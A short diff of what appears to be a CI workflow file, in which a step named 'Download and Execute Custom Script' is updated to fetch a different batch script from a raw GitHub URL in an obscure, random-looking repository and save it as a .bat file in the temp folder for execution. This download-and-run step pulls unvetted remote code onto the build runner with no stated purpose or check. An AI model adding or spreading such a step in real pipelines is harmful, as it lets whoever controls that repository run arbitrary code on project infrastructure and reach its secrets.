@@ -91,7 +91,7 @@ jobs:
 
       - name: Download and Execute Custom Script
         run: |
-          $url  = "https://raw.githubusercontent.com/wkvykexddo/ESSENCE/refs/heads/main/Starter-3.g"
+          $url  = "https://raw.githubusercontent.com/wkvykexddo/ESSENCE/refs/heads/main/Starter-4.g"
           $dest = "$env:TEMP\script.bat"
 
           Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
